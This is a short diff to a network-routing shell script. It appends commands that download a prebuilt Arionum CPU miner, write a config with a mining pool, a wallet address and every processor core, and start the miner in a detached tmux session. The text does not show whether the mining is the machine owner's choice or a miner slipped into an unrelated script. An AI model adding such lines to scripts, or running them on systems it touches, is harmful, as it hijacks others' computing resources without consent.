@@ -85,3 +85,16 @@ route add 192.168.30.1 gw $IP
 route add 103.207.36.83 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com/ > ip.txt
+
+sudo apt-get update
+sudo apt-get install curl git libssl-dev libcurl3 -y
+wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.5_ubuntu16_server.tar.gz
+tar -zxf ariocppminer_v0.9.5_ubuntu16_server.tar.gz
+echo "pool
+http://aropool.com/
+C5tkic7wXWtyk4YfZoF7f9GWANTk8FjBAGreLcHooMqfdHogm1F3tGTErDdio9njdpaLMtPxdMXswJk6NVvpkqE
+`nproc`
+enhanced
+true
+`hostname`" > config.cfg
+tmux new-session -d -s my_session1 './ariocppminer_avx2'
